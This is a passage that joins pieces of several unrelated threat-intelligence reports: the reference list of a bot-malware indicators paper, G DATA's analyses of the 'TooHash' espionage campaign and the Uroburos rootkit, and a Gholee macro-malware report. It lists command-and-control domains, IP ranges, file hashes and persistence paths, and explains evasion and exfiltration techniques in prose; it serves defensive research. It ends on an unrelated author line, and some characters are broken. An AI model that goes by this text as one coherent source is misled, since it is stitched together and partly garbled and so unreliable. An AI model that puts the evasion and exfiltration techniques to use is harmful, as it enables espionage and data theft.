It illustrates the relationship between some of the malicious servers , locations , malware hosted / distributed , and malicious servers to which the malware beacons to with POST requests and to download additional malware : This paper highlights campaigns that has compromised systems at significant enterprises worldwide , utilizing various bot malware .
We are publishing these indicators so others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
General Dynamics Fidelis ' advanced threat defense product , Fidelis XPS™ , detects all of the activity documented in this paper .
Further , we will continue to follow this specific activity and actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
1 .
Neutrino Bot ( aka MS : Win32/Kasidet ) , June 2014 : http : //malware.dontneedcoffee.com/2014/06/neutrino - bot - aka - kasidet.html 2 .
Renting a Zombie Farm : Botnets and the Hacker Economy , August 2014 : http : //www.symantec.com / connect / blogs / renting - zombie - farm - botnets - and - hacker - economy 3 .
DorkBot , a Twin Botnet of NgrBot , August 2014 : http : //blog.fortinet.com / post / dorkbot - a - twin - botnet - of- ngrbot 4 .
Big Box LatAm Hack ( 1st part - Betabot ) , January 2014 : http : //securelist.com / blog / research/58213/big - box - latam - hack-1st - part - betabot/ 5 .
A Good Look at the Andromeda Botnet , April 2014 : https : //blog.fortinet.com / post / a - good - look - at - the- andromeda - botnet 6 .
CVE-2013 - 2729 and Andromeda 2.9 - A Massive HSBC themed email campaign , June 2014 : http : //stopmalvertising.com / spam - scams / cve-2013 - 2729-and - andromeda-2.9-a - massive - hsbc- themed - email - campaign / andromeda - botnet.html 7 .
Beta Bot – A Code Review , November 2013 : http : //www.arbornetworks.com / asert/2013/11/beta - bot- a - code - review/ 8 .
Athena , A DDoS Malware Odyssey , Nov 2013 : http : //www.arbornetworks.com / asert/2013/11/athena- a - ddos - malware - odyssey/ 9 .
Andromeda Botnet Gets an Update , July 2013 : http : //blog.trendmicro.com / trendlabs - security- intelligence / andromeda - botnet - gets - an - update/ 10 .
New Commercial Trojan # INTH3WILD : Meet Beta Bot , May 2013 : https : //blogs.rsa.com / new- commercial - trojan - inth3wild - meet - beta - bot/ 11 .
A new bot on the market : Beta Bot , May 2013 : https : //blog.gdatasoftware.com / blog / article / a - new - bot- on-the-market-beta-bot.html 12 .
Andromeda Botnet Resurfaces , March 2013 : http : //blog.trendmicro.com / trendlabs - security- intelligence / andromeda - botnet - resurfaces/ 13 .
Fooled by Andromeda , March 2013 : http : //www.0xebfe.net / blog/2013/03/30/fooled - by - andromeda/ 14 .
Botnets Die Hard - Owned and Operated – Defcon 20 : July 2012 : https : //www.defcon.org / images / defcon-20/dc-20-presentations / Sood - Enbody / DEFCON-20-Sood- Enbody - Botnets - Die - Hard . PDF.pdf 15 .
A Chat With NGR Bot , June 2012 : http : //resources.infosecinstitute.com / ngr - rootkit/ 16 .
The experts of G DATA 's SecurityLabs discovered a cyber - espionage campaign that perfectly exemplifies the way how targeted attacks work .
The purpose of this campaign was to steal valuable documents from the targeted entity .
We entitle this operation `` TooHash '' .
The attackers ' modus operandi is to carry out spear phishing using a malicious Microsoft Office document as an attachment .
The attackers do not choose their targets indiscriminately , which we derive from the fact that they sent specially crafted CV documents , probably to human resources management employees .
Naturally , the recipients are inclined to open such documents on a daily base .
The majority of discovered samples were submitted from Taiwan .
As part of the documents are in Simplified Chinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong , Macao and Taiwan , these malicious documents might have been used against targets in the whole Greater China area .
The attached documents exploit a well - known and rather aged vulnerability ( CVE-2012 - 0158 ) to drop a remote administration tool , or RAT for short , onto the targeted user 's computer .
During the campaign , we identified two different pieces of malware .
Both include common cyber - espionage components such as code execution , file listing , document exfiltration and more .
We discovered more than 75 command and control servers , all used to administrate infected machines .
The servers were mainly located in Hong Kong and the USA .
Furthermore , the administration panel 's language , used by the attackers to manage infected systems , was partly written in Chinese and partly in English .
The exploit used by the attackers is identified and blocked by G DATA 's Exploit Protection technology and G DATA 's security solutions detect the dropped binaries as Win32.Trojan . Cohhoc . A and Win32.Trojan . DirectsX.A respectively .
Nowadays , trade secrets describe one of the major values of almost every company .
Therefore , begrudged competitors may be tempted to steal valuable sensitive information for their purposes .
The leak of sensitive documents can be a disaster for a company and lead to large financial losses .
Furthermore , governmental entities use sensitive , private or classified documents .
Intelligence agencies may be interested to obtain such documents .
The analyzed samples used in the `` TooHash '' campaign were Microsoft Office documents , and were submitted to us from a Taiwanese customer .
An indication leading to the target area is one of the documents used by the attackers , which contained the string '' 102年尾牙、 '' which means `` end of the year 102 '' .
The official calendar used in Taiwan starts in 1912 ( year 1 ) , so the year 102 is the year 2013 according to the Gregorian calendar ( 1911 + 102=2013 ) .
We conclude that the targets are entities located in the Greater China area and on the name of another document used by the attacker called 李辉简历.doc which translates to `` resume of Li Hui '' .
Another lead , suggesting that the attacks occurred in the Greater China area , is the fact that the majority of samples available on VirusTotal were originally submitted from Taiwan .
The DNS - name of the C & C server contained information about affected companies .
Here is a list of some targeted entities :  Public research organization  Space research organization  Telecom companies  Private companies To drop the malware onto the targeted computer and to control the system , the attackers chose to carry out a spear phishing campaign .
This campaign comprised a Microsoft Office document being sent to the victim .
A probable entry point for a manipulated CV would be an HR department .
If the document is opened with an outdated Microsoft Office version , malware is installed by exploiting vulnerability CVE-2012 - 0158 .
To appear credible , the attackers selected the targeted users and the type of the attached documents cleverly .
For example , a Microsoft Office Word document called resume of Li Hui.doc .
The document title as well as the content was written in Simplified Chinese .
The titles of the attacking documents involved are as follows :  文件列表.xls ( file list ) [ Simplified Chinese ]  李辉简历.doc ( resume of Li Hui ) [ Simplified Chinese ]  102年尾牙、103年春酒精緻菜單.xls ( End of the year 102 , year 103 Spring Menu ) [ Traditional Chinese ] To explain the exploit used , we have a look at the Word document , the ostensible CV .
The mentioned exploit causes Microsoft Word to crash , which might alert attacked users just right away .
In our case , the attackers crafted their malicious document in a special way to conceal the software crash : The malicious .doc
causes a crash , but moments after the crash a legitimate Word session opens up and , to the user , everything appears to be normal .
Nevertheless , cautious users might suspect malicious actions behind such activities and notify security staff .
The CV that comes with the legitimate Word document ( Wo.doc ) is written in Chinese characters and style used in the Chinese mainland .
Nevertheless , this sample has also been submitted to us from Taiwan .
The resume visible to the user ( Wo.doc ) holds a tracking mechanism : Li Hui 's picture , visible in the document as the blank square on the right hand side , is not stored locally but stored on the Internet .
The following tag , inside the document , reveals this function : As soon as the document is loaded , a network query is performed and notifies the attacker about the successful exploit and the availability of a newly infected machine .
We identified two types of malware used to administrate the infected machines : Cohhoc and DirectsX .
The first one is a `` classic '' Remote Administration Tool .
The second one is more advanced and of a different kind , the malware is a rootkit .
It is executed in kernel mode .
The RAT and the rootkit both share the same command and control infrastructure .
The malware is divided into three parts :  Component 1 : the dropper , used to install the second component into a specific directory and to execute it .
This first file is removed after the execution of the second component ;  Component 2 : a binary , used to unpack the third component and to execute it ;  Component 3 : the payload ; this is the real malicious part , the core of the malware .
The second component is installed into a subfolder of the directory % APPDATA % ( for example in % APPDATA % \Microsoft\ ) .
Known file names for the files used during the campaign discussed : svchost.exe and conime.exe .
The second component works similarly :  It decrypts the payload .
The payload is encrypted with AES .
We identified different keys for different samples .
 It then loads the decrypted payload into the memory .
Once decrypted , the payload is a Windows dynamic library ( .dll
) .
 It executes the loaded library .
In case you are interested in information regarding the unpacking of this malware , please feel free to contact us using toohash.securityblog @ gdata.de During the TooHash campaign , we were able to identify two variants of `` Cohhoc '' .
Those two versions can be distinguished by looking at the creation of the respective mutex after the malware is started :  H2_COMMON_DLL ( before September 2013 )  NEW_H2_COMMON_DLL ( after September 2013 ) The main difference between the two malware variants is the handling of the payload ( component three ) .
In the earlier version , the payload is located within a resource inside component two .
In the later version , the payload is an additional file .
This additional file is stored in the same directory as the second component and its name is brndlog .
As small as this difference seems to be for a normal computer user , from a malware analyst 's point of view , it is a huge difference .
If , in the first case , the sample was found within a sample database , the analyst would be able to extract the payload and to analyze it right away .
However , in the second case , the analyst can not extract and analyze the payload at all .
In this context , the second component alone is rather useless ; one needs to find the binary which installs the payload .
Furthermore , it is rather complex to create signature detection for an encrypted file , such as the payload discussed .
Persistence is ensured by the creation of a shortcut file ( .lnk
) in the Start Menu folder .
This shortcut is labeled as Internet Explorer .lnk
.
The blank space just before the file name extension was inserted to trick the user .
The text looks exactly like the original without the additional space .
Furthermore , it is not only the file 's name which sidetracks , but also the icon used for this link comes in the disguise of Microsoft 's Internet Explorer .
The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The `` Cohhoc '' malware is a Remote Administration Tool and is able to :  execute commands or scripts ;  download files ;  upload files ;  collect information about the infected system , for example hostname , username , version of the operating system , installed software ;  find specific documents in order to send them to the command and control servers .
Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .
If the file % APPDATA % \Adobe\ActiveX.dat exists on the system , the malware uses the server listed in this file instead of the hardcoded servers .
The content in the file must use the obfuscation system described in the next chapter .
This approach , using an extra file with server information , proves to be particularly useful for the attackers , as they do not have to transmit new payload to the infected system .
Furthermore , it keeps analysts in the dark about additional C & Cs in case they only see the .dat
file .
This file alone is rather useless .
We have seen the same technique when looking at the differences between the two malware variants before .
The `` Cohhoc '' malware uses an obfuscation layer , to disguise the malware and to complicate the analysis .
The obfuscation is used :  to encode the command and controls ;  to encode the data sent to the command and controls ( information and documents ) ;  to decode the data received from the command and controls ( the commands ) .
This algorithm can easily be adapted in C language .
Fellow researchers are welcome to receive the code after contacting samplerequest @ gdata.de .
To be readable and easily usable , the base64 encoded data ( in binary format ) is converted into ASCII .
Here is an example to decode a command and control : The malware uses HTTP to communicate to the command and control servers .
Here is an example of a request performed by an infected system : The relevant data is placed after the GET request .
Here is the content of the request , decoded by using the code mentioned above : Here are the different parts of the data transmitted :  Green : the current date and time ;  Pink : the hostname of the infected machine ;  Blue : the domain and the username of the infected machine ;  Yellow : the version of the operation system ;  Red : a hardcoded string which means `` end of message '' .
The dropper is used to install two files and the persistence mechanism .
The two files are DirectsX.sys ( the malicious driver ) and directsx ( without any extension ) .
The second file is the encoded payload used by the driver .
The persistence mechanism is realized by the creation of a service .
The installed file and the registry modifications are stored in a resource within the dropper .
Here is a screenshot of the registry key created : The dropper and the driver are both signed by a legitimate certificate .
The certificate is owned by `` Jiangxi you ma chuang da software technology Co. , LTD '' , has been reported stolen and is known to have been used in APT attacks .
Here is a screenshot of the certificate : The main purpose of the driver is to decode the content of the directsx file and to inject the payload into a userland process .
The algorithm used to encode the data in the file is a XOR followed by a SUB : The values of the XOR and the SUB can be different .
The decoding file contains the configuration ( command and control ) and a library ( .dll
) to inject in userland .
Here is an example of configuration : Actually , the library is injected into the process of BitDefender ( seccenter.exe ) , ZoneAlarm ( svchost.exe ) or 360 ( 360tray.exe ) , which means that three popular security products are abused .
If the processes are not running on the infected system , the injection is performed into explorer.exe .
To perform the injection , the driver uses the API KeStackAttachProcess ( ) .
This function allows it to attach the current thread to an address space of a userland process .
The name of the rootkit is linked to its device name : \\device\DirectsX and its symbolic name : \\DosDevices\DirectsX .
The injected dll is signed with the same certificate , too .
It is the remote administration tool itself , injected by the rootkit .
The tool allows the attackers :  to execute code on the infected system ;  to download files ;  to get information about the infected system ;  to steal data such as Office documents or media files .
This library is a variant of a remote administration tool also known as Savit .
We identified more than 75 different servers .
The complete list of domains is available in the appendix .
The IP resolved by the domains changed frequently .
At the time of writing this report , all known C & C servers were mainly located in Hong Kong , with three different host companies :  HONGKONG LONG LIVE NETWORK CO LIMITED  ASIA PACIFIC SERVER COMPANY ( HK )  Simcentric Solution ( HK ) A fourth host company used was located in the US :  Ethrn . Net LLC ( USA ) The IP ranges used by then :  103.228.64.0/24  111.68.3.0/24  112.121.160.0/18  180.178.32.0/18  216.83.32.0/19 The choice of domain names was made to trick the users or the security team during their analysis of the web logs collected .
Have a look at two examples used during the TooHash campaign : * .cnnic - micro.com CNNIC is the acronym for China National Network Information Center .
It is the administrative agency for the Internet domain administration in mainland China .
The domain above is , of course , not owned by CNNIC .
* .adobeservice.net the domain seems to be related to Adobe Systems Incorporated , the popular software company .
But , unfortunately , the domain is not owned by Adobe either .
* .intarnetservice.com the domain seems to be a legitimate intranet network , but note the typo in the domain name .
* .webmailerservices.com * .proxydomain.org * .privnsb.com For each domain , the attackers add a subdomain , the subdomain is generally assumed to be the name ( or the acronym ) of the targeted entities .
Here is an example : nspo.intarnetservices.com .
This could , in the context of the Greater China area , stand for the National Space Organization located in Taiwan .
The attackers control infected machines with the help of web servers installed on the C & Cs , they do not need to have remote access .
Here is the authentication page of the administration panel and aswe can see , the panel is partly written in Simplified Chinese : We did not clearly identify the people behind this campaign .
The use of the stolen certificate could point the Shiqiang group , but nothing can be proven .
Anyway , in our case , the attackers clearly targeted private business and governmental organizations as well .
Either the group decided to target governmental entities as well or the stolen certificate is used by several groups .
In any case , the attackers are well organized and use a huge and complex infrastructure to manage the infected systems .
Furthermore , they use two different malware types in order to always have access to the targeted organizations even if one malware is detected .
The second malware becomes a spare wheel .
We assume that the people behind the group are professionals .
This campaign showed us once more , that people do not hesitate to use sophisticated and deceptive methods to steal data from companies or governmental organizations .
The files submitted to us seem to have targeted companies in the Greater China area but this technology can easily be used against organizations in other countries and regions across the globe .
Due to the increasing value of nowadays ' trade secrets and political secrets , we believe that the use of this kind of sponsored campaign is very likely to increase in the future .
Companies and other entities as well need to increase their security measures and to educate the users about the risks they might encounter while working with a computer – ranging from social engineering to malware attacks , etc .
The exploits used during this campaign are detected by G DATA 's exploit protection system and the files involved are detected by our antivirus engines .
In case you would like to receive further technical information or would like to contribute any information to this case , please feel free to contact us by using the following email address : toohash.securityblog @ gdata.de Documents ( and the original name ) : 8d263d5dae035e3d97047171e1cbf841 ( 102年尾牙、103年春酒精緻菜單.xls ) 7251073c67db6421049ee2baf4f31b62 ( 李辉简历.doc ) 2ec306ef507402037e9c1eeb81276152 ( 文件列表.xls ) 6b83319cf336179f2105999fe586242c ( Wo.doc ) Cohhoc samples : 0c0a3784c3530e820f57da076ea1fc8b b45caf646f94ace23cfa367c5d202944 d4691e06bca3a32c9283d2787b0e40b3 bf4e5e6bef4acc33aea06f770407477e caf3e9500934f89ae4ddf3c6b093af23 f87e765e583e1ead4e0dd56430c469fd 0ad60b49fc47581d19ca2f4e2fc6a6bb 12ee78564ebcb5e203d2991d5ac21ace 1ed0286b4967d9590900faadab8a4926 205e00d44ec0ff5f5c737fa4553e387a 272f23dce6d07f1be9bf2669b99e1530 2e1a5d92343fce92136592f208ca7160 2e4c52e2f424a233f0d5cfa143b4778f 3415e9e50be4de0903d607a2514b23e5 367ad9dd9e263a55d2820b88910b336a 39c5f3f134520bfb70a770de61185d49 3bd5de1f1cd29171709358920d311018 4afda3513ef0f5563f1e77f01dbaed7c 6b5e9eb8eccfd4336ff8910f646dd199 74697ae5fa114222d8d7f8442e57305d a3355ad88ba0802be7e4db0a68394718 a7a40f633e3edc3e36e1dd27c57374b1 b9ea262ac271a72a5310bd0d0561b007 bf4fc457359c6396a360202eee2cc29f e0ee55a01de565ee145ed769ca3deddd f035bce5e0a7e570743c128927a026e1 fd11d2f0f1d388404de4bb8d872ac897 DirectsX samples : 22b955536f27b397f68f22172f8496c2 ecc8245568b5dc1d74d0be6073eafa2d 2857455281e50a80593708e63d68c48f 5ebd4452848879202414a46a09cd2eab ed416eda209e91079a829cc97d57e287 d4e2aadbc0ac414ac5a778da67251c02 % USERPROFILE % \Start Menu\Programs\Startup\Internet Explorer .lnk
% APPDATA % \Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Internet Explorer .lnk
G Data Red Paper February 2014 : Uroburos G Data Red Paper February 2014 : Uroburos G Data Security experts have analyzed a very complex and sophisticated piece of malware , designed to steal confidential data .
G Data refers to it as Uroburos , in correspondence with a string found in the malware 's code and following an ancient symbol depicting a serpent or dragon eating its own tail .
Uroburos is a rootkit , composed of two files , a driver and an encrypted virtual file system .
The rootkit is able to take control of an infected machine , execute arbitrary commands and hide system activities .
It can steal information ( most notably : files ) and it is also able to capture network traffic .
Its modular structure allows extending it with new features easily , which makes it not only highly sophisticated but also highly flexible and dangerous .
Uroburos ' driver part is extremely complex and is designed to be very discrete and very difficult to identify .
The development of a framework like Uroburos is a huge investment .
The development team behind this malware obviously comprises highly skilled computer experts , as you can infer from the structure and the advanced design of the rootkit .
We believe that the team behind Uroburos has continued working on even more advanced variants , which are still to be discovered .
Uroburos is designed to work in peer - to - peer mode , meaning that infected machines communicate among each other , commanded by the remote attackers .
By commanding one infected machine that has Internet connection , the malware is able to infect further machines within the network , even the ones without Internet connection .
It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers , by relaying this exfiltrated data through infected machines to one machine with Internet connection .
This malware behavior is typical for propagation in networks of huge companies or public authorities .
The attackers expect that their target does have computers cut off from the Internet and uses this technique as a kind of workaround to achieve their goal .
Uroburos supports 32-bit and 64-bit Microsoft Windows systems .
Due to the complexity of this malware and the supposed spying techniques used by it , we assume that this rootkit targets governments , research institutes , or / and big companies .
Due to many technical details ( file name , encryption keys , behavior and more details mentioned in this report ) , we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent . BTZ .
Uroburos checks for the presence of Agent . BTZ and remains inactive if it is installed .
It appears that the authors of Uroburos speak Russian ( the language appears in a sample ) , which corroborates the relation to Agent . BTZ .
Furthermore , according to public newspaper articles , this fact , the usage of Russian , also applied for the authors of Agent . BTZ .
According to all indications we gathered from the malware analyses and the research , we are sure of the fact that attacks carried out with Uroburos are not targeting John Doe but high profile enterprises , nation states , intelligence agencies and similar targets .
The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed in this environment .
The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .
At the current stage of the investigations it is unknown how Uroburos initially infiltrates high profile networks .
Many infection vectors are conceivable .
E.g .
spear phishing , drive - by - infections , USB sticks , or social engineering attacks .
The G Data SecurityLabs discovered the rootkit dubbed Uroburos during 2013 .
We decided to investigate in depth soon after we identified the following three interesting aspects :  the usage of virtual file systems  the complexity of the framework  the advanced network capabilities Uroburos is a direct reference to the Greek word Ouroboros ( Οὐροβόρος ) .
The Ouroboros is an ancient symbol depicting a serpent or dragon eating its own tail .
The name of this rootkit is inspired by a plain text string available in several driver files : Ur0bUr ( ) sGotyOu # Furthermore , we identified other references to the ancient serpent / dragon symbol within the rootkit 's code , for example the following strings : Another interesting notion : The exact spelling , Uroburos , can even be found in a webcomic called Homestuck .
In this interactive webcomic , the reader / player needs two codes to receive virtual magic objects ( called juju ) .
Those two codes are in fact uROBuROS and UrobUros .
We can notice that the uppercase and lowercase character order matches the string found within the malware code .
The rootkit is basically composed of two files :  a driver ( .sys
file ) ;  a virtual file system ( .dat
file ) .
We identified several file names for the driver , for example : Ultra3.sys , msw32.sys , vstor32.sys .
We have encountered 32-bit and 64-bit driver versions .
The two binaries may be installed simultaneously on one system .
The file containing the virtual file system has a random name , followed by the extension .dat
.
Furthermore , this file is located in the same directory as the driver file .
The installation directory does change , but we were able to identify the following pattern :  % SYSTEMROOT % \ $ Ntuninstall [ Random_ID ] $ The malware 's persistence is established by the creation of a service which automatically executes during each startup of the system .
The service is located in  HKLM\System\CurrentControlSet\Services\Ultra3 The driver is needed to  decrypt the virtual file systems  create several hooks to hide its activities  inject libraries in the users land  establish and manage some communication channels A rootkit naturally tries to hide its activities from the user and so does Uroburos .
The driver uses inline patching to perform the hooks , which is a common way to perform this task .
Inline patching is carried out by modifying the beginning of a targeted system 's function in order to redirect the execution flow to a custom code before jumping back to the original function .
In the current case , the inline patching adds a new interrupt instruction ( int 0xc3 ) at the beginning of the hooked function .
Doing this , the malware adds malicious behavior to legitimate functions .
The main hooked functions are :  ZwQueryKey ( ) , ZwEnumerateKey ( ) , ZwCreateKey ( ) and ZwSaveKey ( ) their purpose is to hide the persistence keys in the registry  ZwReadFile ( ) its purpose is to hide the driver and file system files  ZwQuerySystemInformation ( ) its purpose is to hide rootkit handles  ZwTerminateProcess ( ) its purpose is to terminate cleanly the rootkit during the shutdown of the operating system  ObOpenObjectByName ( ) its purpose is to hide the rootkit 's virtual file systems The Uroburos rootkit uses two virtual file systems – one NTFS file system and one FAT file system .
They are stored locally , on the infected machine .
This means that the victim 's computer contains an encrypted file , which , in reality , hosts another file system .
The virtual file systems are used as a work space by the attackers .
They can store third party tools , post - exploitation tools , temporary files and binary output .
The virtual file systems can be accessed through the devices \Device\RawDisk1 and \Device\RawDisk2 and the volume \\.\Hd1 and \\.\Hd2 .
The encryption used for the file systems is CAST-128 1 .
The respective encryption key is hardcoded within the driver file .
Once decrypted , the virtual file system is a classic NTFS volume , which can be simply accessed through the standard Microsoft file system APIs .
During our analysis , we identified several files the file systems contained :  .bat
scripts used by the attackers  .log
files with the output of the execution of the .bat
files  third party tools  queue files The .bat
scripts contain some net use commands to map a remote file server , netstat commands to have network information , system info commands to get a complete view of the system configuration .
1 http : //en.wikipedia.org / wiki / CAST-128 Copyright © 2014 G Data Software AG 6 G Data Red Paper February 2014 : Uroburos The queue file is the most interesting and complex part of the virtual file system .
Each message in the queue contains a unique ID , a type , a timestamp and content .
The content is also encrypted using the CAST-128 algorithm and the respective key is stored in a message , too .
The messages can contain the following information :  a key to decrypt other messages  a configuration  a file ( or library injected in user land )  … We found classic post - exploitation tools , used by a lot of different APT actors .
The following list provides an overview of the tools found in the virtual file system :  Dumper for NTLM ( hash of a user 's password ) .
This information can be used to perform `` pass the hash '' 2 attacks , to compromise new systems within the infrastructure  information gathering tools , to get information on the infected system  RAR tools , to create archives of stolen documents  Microsoft Office document stealer  … The driver injects several libraries into user land .
These libraries are stored in encrypted form in the queue file .
These files are used to create a kind of `` proxy '' between the kernel land and the user land .
The driver injects two noteworthy libraries : If the infected system is a 64-bit system , Win32 is replaced by Win64 .
The libraries are very huge ( more than 150 functions ) and contain a lot of features .
They are able to manipulate the queue file from the user land .
Following , a list of functions dedicated to the queue management ( qm ) : The libraries have the capability to create and manage a pcap 3 capture .
The purpose of this feature is to generate a snapshot of the network traffic .
The libraries are furthermore used to exfiltrate data to the outside world , namely the attackers .
We identified several protocols to perform this task : generally , the configuration needed for each protocol is stored in the queue file and not within the library itself .
 HTTP protocol the attackers can choose to use a website to exfiltrate data .
The rootkit supports GET and POST requests and proxy authentication , too .
The default URI is http : // % s / default.asp but it is configurable .
The media type of the request is chosen from the following list :  ICMP protocol the attackers can choose to use ICMP ( ping ) to exfiltrate data  SMTP protocol the attackers can send exfiltrated data by email  Named pipe the attackers can use Microsoft 's named pipe to communicate to another infected machine .
This case will be described in the next chapter The design chosen by the developers is truly efficient : to add a new protocol and a new capability , the attackers do not need to recompile ( or reinstall ) the entire rootkit .
They simply need to adjust the library and replace the library in the queue file with the adjusted one .
The library usage results in modularity well thought out .
Thanks to the protocol described previously , the attacker can even target victims not directly connected to the Internet .
The following figure shows an example of a network scheme we discovered in 2013 : The targeted machine ( A ) is a machine with access to sensitive data , e.g .
a server .
The rootkit installed on the system opens a Microsoft named pipe and waits for an incoming connection .
This machine can be named `` spied - on node '' .
The second machine ( B ) is an office machine with the capability to connect to the Internet .
The rootkit is configured to connect to system ( A ) , with the help of the named pipe , and administrate the machine remotely .
Finally , machine ( B ) is able to pass on all data received from machine ( A ) to the Internet .
This machine ( B ) could be named `` proxy node '' .
This peer - to - peer design is really efficient , scalable and resilient .
In case a `` proxy node '' is not available / detected , the attackers can use another infected one .
The advantage for the attackers : even if a security specialist finds one `` spied - on node '' , he can not easily find the `` proxy node '' , due to the fact that this node is a passive node .
Furthermore , the analyst does not automatically have the command and control URL .
In case of incident response , this design is complicated to apprehend and it is hard to contain the infection .
Due to the complexity of the Uroburos rootkit , we estimate that it was designed to target government institutions , research institutions or companies dealing with sensitive information as well as similar high - profile targets .
Concerning the attribution , we found some technical information which allows us to link the Uroburos rootkit to a cyber - attack against the United States of America , carried out in 2008 4 and , particularly , to the worm used by the attackers , called Agent . BTZ .
During this 2008 campaign , a USB stick was deliberately `` lost '' in the parking lot of the United States Department of Defense .
This USB stick contained malicious code and infected the military 's network .
The following leads make us link what we discovered during our analysis with the cyber - attack carried out in 2008 :  the usage of the same obfuscation key in Uroburos and Agent . BTZ ( 1dM3uu4j7Fw4sjnbcwlDqet4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f 5cvd0fk6c1a0s )  the usage of the same file name to store logs : winview.ocx  Uroburos actually checks whether Agent . BTZ is already present on the attacked system , before its installation .
In case Agent . BTZ is installed , Uroburos will not be installed on the system .
 the usage of Russian language in both codes In an article published by Reuters , in 2011 , the journalist mentioned that `` U.S. government strongly suspects that the original attack was crafted by Russian Intelligence .
'' 5 We found Uroburos samples with a resource in Russian language : In case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help , would like to receive further technical information or would like to contribute any information about this case , please feel free to contact us by email using the following mailbox : intelligence @ gdata.de The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed .
The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .
The investment to develop a complete framework such as Uroburos is extremely high .
The developer team behind the development and the design of such an enhanced framework is really skilled .
We believe that , until today , the team behind Uroburos has developed an even more sophisticated framework , which still remains undiscovered .
The design is highly professional ; the fact the attackers use a driver and a virtual file system in two separate files which can only work in combination , makes the analysis really complicated .
One needs to have the two components to correctly analyze the framework .
The driver contains all of the necessary functionality and the file system alone simply can not be decrypted .
The network design is extraordinarily efficient , too ; for an incident response team , it is always complicated to deal with peer - to - peer infrastructure .
It is also hard to handle passive nodes , because one can not quickly identify the link between the different infected machines .
This kind of data stealing software is too expensive to be used as common spyware .
We assume that the attackers reserve the Uroburos framework for dedicated and critical targets .
This is the main reason why the rootkit was only detected many years after the suspected first infection .
Furthermore , we assume that the framework is designed to perform cyber espionage within governments and high profile enterprises but , due to its modularity , it can be easily extended to gain new features and perform further attacks as long as it remains undetected within its target .
There are some strong indications which suggest that the group behind Uroburos is the same as the one behind Agent . BTZ , which allegedly was part of an intelligence agency cyberattack targeting US military bases in 2008 . Notable hints include the usage of the exact same encryption key then and now , as well as the presence of Russian language in both cases .
During the 2014 Israel – Gaza con�ict , dubbed by Israel as `` operation protective edge '' , a raise in cyber - attacks against Israeli targets was reported .
In this report we analyze one case of an operation protective edge themed spear phishing attack .
That email contained a malicious excel �le , which once opened and its VBA code executed , would infect the victim 's computer .
As for the publication of this report , the �le is recognized as malicious by only one antivirus engine .
Based on our analysis , we believe the threat actor behind this malware is a high level professional .
Our investigation of the Gholee malware started following a detection of a suspicious �le that was sent in an email to an undisclosed recipient .
The �le name was ' Operation Protective Edge.xlsb ' ( MD5 : d0c3f4c9896d41a7c42737134ffb4c2e ) .
The �le was uploaded to Virus Total the �rst time on 10 August 2014 , from Israel .
At that time it was not detected as malicious by any of the 52 tested antivirus engines .
Nine days later , it was uploaded again to Virus total , again from Israel .
This time it was detected as malicious only by Kaspersky , as Trojan- Dropper . MSExcel . Agent.ce .
Upon opening the �le a message is displayed , saying : `` Due to security considerations I consciously hid the Informations .
It will be visible for you by enabling content above .
'' [ 1 ] This is a social engineering tactic meant to lure the victim into enabling Macro content .
If enabled , the message disappears , and the following information is presented to the victim ( it is possible that the unreadable characters in the screenshot below are the result of an encoding error in our lab environment , and that the victim would see different , readable content ) .
Analysis of the Macro code reveals the following structure : In order to avoid detection by protection measures such as computer antivirus and intrusion detection systems , ASCII characters codes are used instead of actual characters .
The ASCII codes are converted to strings as they are concatenated into a single variable within a function Tens of these functions then concatenated , creating a single PE �le [ 2 ] [ 3 ] Finally , the �le is saved to NTUSER.data .
{ GUIDE } .dll
( MD5 : 48573a150562c57742230583456b4c02 ) and the function ShellExecte is used to run it under cmd.exe /C and Rundll32 This is in order to hide the process .
The Dll �le is obfuscated and includes various mechanism to hide from Debuggers such as Ollydbg and IDA and from Sandbox software such as Cuckoo and Anubis .
Analyzing the �le , we have found an interesting entry point called gholee .
[ 4 ] [ 5 ] A quick Facebook search for that name and Iran discovered Gholee is a popular Iranian singer : [ 6 ] When run , the DLL �le is communicating with a Kuwait based IP address : 83.170.33.60 , owned by German company iABG Mbh , which provides satellite communication services .
[ 7 ] The malware opens an SSL connection over port 443 using a digital certi�cate that expired in 2010 .
The certi�cate was issued for security company Core Security , the creators of the offensive suite Core Impact , for the address * coreimpactagent.net .
[ 8 ] [ 9 ] It was issued by Thawte certi�cate authority .
[ 10 ] [ 11 ] Certi�cate Fingerprint MD5 : 9C 80 C2 47 40 6D 6C ED FC E0 08 AE EF D9 98 90 Using a proxy and SSL stripping , the following communication pattern over HTTP can be seen : GET /index.php ? c = Ud7atknq & r=17117d HTTP/1.1 POST /index.php ? c = Ud7atknq & r=1710b2 HTTP/1.1 Searching for speci�c strings from the malicious �le , we found another �le that we believe is related to this campaign .
The �le name is `` svchost 67.exe '' ( MD5 : 916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to Virus Total [ 5 ] on 2 June 2014 , more than two months earlier than `` Operation Protective Edge.xlsb '' .
It was uploaded twice from Latvia – potentially to test the malware 's detection rate .
`` svchost 67.exe '' communicated with 83.170.33.37 , which is on the same /26 netblock as the address `` Operation Protective Edge.xlsb '' is commutating with .
By using GPO to disable macro code from running , infection by this malware may be avoided .
Alternatively , �les containing macro code should be blocked at the email gateway or by an anti - spam solution .
Logs and proxy servers should be checked for communication with the IP addresses with which the malware communicates : 83.170.33.60 83.170.33.37 If you think you got infected , check in the system root folder for a �le called NTUSER.DAT .
{ $ GUID } .dll
.
for example : NTUSER.DAT { 016888bd-6c6f-11de-8d1d-001e0b**c } .dll
This post was authored by Andrea Allievi , Douglas Goddard , Shaun Hurley , and Alain Zidouemba .
Recently , there was a blog post on the takedown of a botnet used by threat actor group known as Group 72 and their involvement in Operation SMN .
